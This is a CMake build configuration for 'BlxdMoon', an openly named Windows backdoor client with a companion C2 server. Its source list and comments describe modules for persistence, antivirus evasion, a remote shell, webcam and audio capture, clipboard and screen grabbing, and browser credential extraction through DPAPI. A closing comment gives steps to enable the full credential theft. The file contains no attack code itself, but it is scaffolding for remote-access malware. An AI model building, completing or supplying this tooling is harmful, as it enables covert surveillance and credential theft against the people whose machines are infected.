cmake_minimum_required(VERSION 3.10)

project(BlxdMoon)

set(CMAKE_C_STANDARD 11)
set(CMAKE_CXX_STANDARD 17)

include_directories(include)

# Backdoor executable (client) - Windows only
if(WIN32)
add_executable(backdoor
    src/backdoor.c
    src/logger.c
    src/screen.c
    src/status.c
    src/str_cut.c
    src/uuid.c
    src/wol.c
    src/process.c
    src/clipboard.c
    src/browser.c
    src/webcam.c
    src/crypto.c
    src/persistence.c
    src/evasion.c
    src/audio.c
    src/wifi.c
    src/shell.c
    src/bypass.c
    src/troll.c
    src/scare.c

    # Uncomment and add sqlite3.c when using browser credential extraction:
    # src/sqlite3.c
)
endif()

# Server executable (C2)
add_executable(server
    src/server.c
    src/status.c
    src/str_cut.c
    src/crypto.c
)


# Backdoor libraries (Windows only)
if(WIN32)
target_link_libraries(backdoor
    ws2_32      # WinSock2 networking
    gdi32       # Graphics (screenshots)
    winmm       # Multimedia (audio recording)
    bcrypt      # Cryptography (AES, ECDH, SHA-256)
    crypt32     # DPAPI (browser credential decryption)
    strmiids    # DirectShow GUIDs (webcam)
    ole32       # COM (webcam)
    shell32     # Shell API (SHGetFolderPath for persistence)
    # mfplat    # Media Foundation (alternative webcam - uncomment if using)
    # mf        # Media Foundation
    # mfreadwrite # Media Foundation
    # mfuuid    # Media Foundation GUIDs
)
endif()

# Server libraries (cross-platform)
if(WIN32)
    target_link_libraries(server
        ws2_32      # WinSock2 networking
        bcrypt      # Cryptography
    )

else()
    find_package(Threads REQUIRED)
    target_link_libraries(server
        Threads::Threads    # POSIX threads
    )
endif()

# Compiler definitions
if(WIN32)
    target_compile_definitions(backdoor PRIVATE
        _CRT_SECURE_NO_WARNINGS
        # USE_SQLITE  # Uncomment when sqlite3.c is added for browser creds
    )
    target_compile_definitions(server PRIVATE
        _CRT_SECURE_NO_WARNINGS
    )
endif()

# Note: For full browser credential extraction, download sqlite3 amalgamation:
# https://www.sqlite.org/download.html -> sqlite-amalgamation-*.zip
# Extract sqlite3.c and sqlite3.h to src/ and include/
# Then uncomment USE_SQLITE and src/sqlite3.c above
